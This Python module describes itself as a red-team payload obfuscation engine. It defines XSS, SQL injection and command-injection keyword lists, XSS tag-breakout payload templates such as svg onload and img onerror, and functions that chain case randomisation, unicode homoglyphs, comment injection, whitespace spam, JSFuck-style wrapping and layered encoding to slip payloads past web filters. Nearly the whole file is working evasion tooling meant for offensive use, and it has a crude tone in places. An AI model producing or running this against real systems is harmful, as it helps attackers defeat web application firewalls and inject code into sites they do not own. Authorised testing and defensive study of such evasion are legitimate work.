# utils/encoders.py
# Advanced multi-layer payload obfuscation and encoding engine for red team bypass

import random
import urllib.parse
import base64
import string
import html
from typing import List, Optional

# ──────────────────────────────────────────────
# Expanded keyword pools for targeted case manipulation & obfuscation
# ──────────────────────────────────────────────
XSS_KEYWORDS = [
    "alert", "prompt", "confirm", "eval", "settimeout", "setinterval", "function",
    "onerror", "onload", "onmouseover", "onfocus", "onmouseenter", "onclick",
    "onpointerover", "ontoggle", "oncontextmenu", "onauxclick", "onbeforetoggle",
    "javascript", "vbscript", "data", "srcdoc", "fetch", "document", "cookie",
    "location", "innerhtml", "outerhtml", "write", "writeln"
]

SQLI_KEYWORDS = [
    "select", "union", "and", "or", "where", "from", "insert", "update", "delete",
    "sleep", "pg_sleep", "waitfor", "benchmark", "substring", "ascii", "char",
    "cast", "convert", "extractvalue", "updatexml", "name_const", "load_file",
    "into outfile", "xp_cmdshell", "utl_http", "dbms_pipe", "information_schema"
]

CMD_KEYWORDS = [
    "whoami", "id", "uname", "cat", "curl", "wget", "nc", "bash", "sh", "powershell",
    "cmd", "system", "exec", "passthru", "shell_exec", "xp_cmdshell", "schtasks",
    "crontab", "net", "tasklist", "certutil"
]

DEFAULT_KEYWORDS = list(set(XSS_KEYWORDS + SQLI_KEYWORDS + CMD_KEYWORDS))

# ──────────────────────────────────────────────
# Expanded obfuscation primitives
# ──────────────────────────────────────────────
WHITESPACE_OBFUSCATION = [
    " ", "\t", "\n", "\r", "%09", "%0a", "%0d", "%20", "/**/", "/* */", "<!-- -->",
    "%2509", "%250a", "%2520", "/*random*/", "/*!*/", "/*!50000*/"
]

COMMENT_INJECTIONS = [
    "/**/", "/* */", "<!-- -->", "/*!*/", "-- ", "# ", " -- ", "\n-- ", "\r-- ",
    "/*abc*/", "/**//**/", "/*! */"
]

UNICODE_CONFUSION = [
    # Visually similar letters for case-insensitive bypass
    "\uFF21", "\uFF41", "\u1D2C", "\u1D2D", "\u2122", "\u1D00", "\u1D01",
    # Zero-width & invisible shit
    "\u200B", "\u200C", "\u200D", "\uFEFF", "\u2060", "\u200E", "\u200F"
]

TAG_BREAKOUT_PATTERNS = [
    "\" autofocus onfocus={payload} x=\"",
    "'><{payload}>",
    "\"/><{payload}>",
    "\" onmouseover={payload} ",
    "\";{payload};//",
    "javascript:{payload}",
    "data:text/html,<script>{payload}</script>",
    "<svg/onload={payload}>",
    "<img/src/onerror={payload}>"
]

JSFUCK_LIKE = [
    "[]+[]", "!![]", "+[]", "[]+{}", "({}+[])", "[]['length']", "[]['push']",
    "(+{})[[]]", "[]['filter']", "[]['map']"
]

def randomize_case(text: str, keywords: List[str] = None) -> str:
    """Apply random mixed case to dangerous keywords only."""
    if keywords is None:
        keywords = DEFAULT_KEYWORDS

    lower_text = text.lower()
    result = list(text)

    for kw in keywords:
        kw_lower = kw.lower()
        start = 0
        while True:
            pos = lower_text.find(kw_lower, start)
            if pos == -1:
                break
            case_kw = ''.join(random.choice([c.upper(), c.lower()]) for c in kw_lower)
            for i in range(len(kw)):
                result[pos + i] = case_kw[i]
            start = pos + len(kw)

    return ''.join(result)


def insert_random_comments(payload: str, density: float = 0.4) -> str:
    """Insert random SQL/JS comments inside tokens."""
    result = []
    i = 0
    while i < len(payload):
        result.append(payload[i])
        if random.random() < density and payload[i].isalpha():
            result.append(random.choice(COMMENT_INJECTIONS))
        i += 1
    return ''.join(result)


def apply_unicode_confusion(payload: str, probability: float = 0.18) -> str:
    """Replace letters with visually similar unicode chars."""
    result = []
    for c in payload:
        if c.isalpha() and random.random() < probability:
            result.append(random.choice(UNICODE_CONFUSION + [c]))
        else:
            result.append(c)
    return ''.join(result)


def apply_whitespace_fuckery(payload: str, level: str = "heavy") -> str:
    """Insert aggressive whitespace/comment spam between tokens."""
    if level == "none":
        return payload

    tokens = []
    current = ""
    for c in payload:
        if c.isspace() or c in string.punctuation:
            if current:
                tokens.append(current)
            tokens.append(c)
            current = ""
        else:
            current += c
    if current:
        tokens.append(current)

    result = []
    for token in tokens:
        result.append(token)
        if random.random() < 0.65 and level in ["medium", "heavy"]:
            result.append(random.choice(WHITESPACE_OBFUSCATION + COMMENT_INJECTIONS))

    return "".join(result)


def apply_tag_attribute_breakout(payload: str, chance: float = 0.45) -> str:
    """Wrap payload in common tag/attribute breakout patterns (XSS)."""
    if random.random() >= chance:
        return payload
    pattern = random.choice(TAG_BREAKOUT_PATTERNS)
    return pattern.format(payload=payload)


def apply_layered_encoding(
    payload: str,
    encode_type: Optional[str] = None,
    double: bool = False,
    triple: bool = False
) -> str:
    """Apply multiple encoding layers in random order."""
    if not encode_type or encode_type == "none":
        return payload

    layers = []

    if encode_type in ["url", "url+"]:
        layers.append(urllib.parse.quote)
        if encode_type == "url+":
            layers.append(urllib.parse.quote_plus)

    if encode_type == "base64":
        layers.append(lambda x: base64.b64encode(x.encode('utf-8')).decode('utf-8'))

    if encode_type == "html":
        layers.append(html.escape)

    if encode_type == "hex":
        layers.append(lambda x: ''.join(f'\\x{ord(c):02x}' for c in x))

    if encode_type == "unicode":
        layers.append(lambda x: ''.join(f'\\u{ord(c):04x}' for c in x))

    random.shuffle(layers)  # Random order = more chaos

    result = payload
    for layer in layers:
        result = layer(result)
        if double:
            result = layer(result)
        if triple and random.random() < 0.5:
            result = layer(result)

    return result


def apply_jsfuck_style(payload: str, chance: float = 0.25) -> str:
    """Basic JSFuck-like obfuscation for extreme cases."""
    if random.random() >= chance:
        return payload
    # Very basic replacement - expand this later if needed
    return f"Function({random.choice(JSFUCK_LIKE)}+'ert'+{random.choice(JSFUCK_LIKE)})(1337)"


def apply_all_bypasses(
    payload: str,
    encode_type: Optional[str] = None,
    double_encode: bool = False,
    obfuscate: bool = True,
    case_manip: bool = True,
    unicode_confusion: bool = True,
    comment_injection: bool = True,
    whitespace_level: str = "heavy",
    tag_breakout_chance: float = 0.45,
    jsfuck_chance: float = 0.20,
    keywords: List[str] = None
) -> str:
    """
    Full bypass chain: random order, aggressive layering, maximum evasion power.
    """
    if keywords is None:
        keywords = DEFAULT_KEYWORDS

    working = payload

    # Stage 1: Keyword-targeted case randomization
    if case_manip:
        working = randomize_case(working, keywords)

    # Stage 2: Unicode visual confusion
    if unicode_confusion:
        working = apply_unicode_confusion(working, probability=0.18)

    # Stage 3: Insert random comments inside tokens
    if comment_injection and obfuscate:
        working = insert_random_comments(working, density=0.45)

    # Stage 4: Whitespace & comment spam between tokens
    if obfuscate and whitespace_level != "none":
        working = apply_whitespace_fuckery(working, level=whitespace_level)

    # Stage 5: Tag/attribute breakout wrappers (XSS-specific)
    if obfuscate:
        working = apply_tag_attribute_breakout(working, chance=tag_breakout_chance)

    # Stage 6: JSFuck-style extreme obfuscation (low chance)
    if obfuscate:
        working = apply_jsfuck_style(working, chance=jsfuck_chance)

    # Stage 7: Encoding layers (last, because it mangles structure)
    if encode_type:
        working = apply_layered_encoding(
            working,
            encode_type=encode_type,
            double=double_encode,
            triple=True  # Aggressive triple encoding on random chance
        )

    return working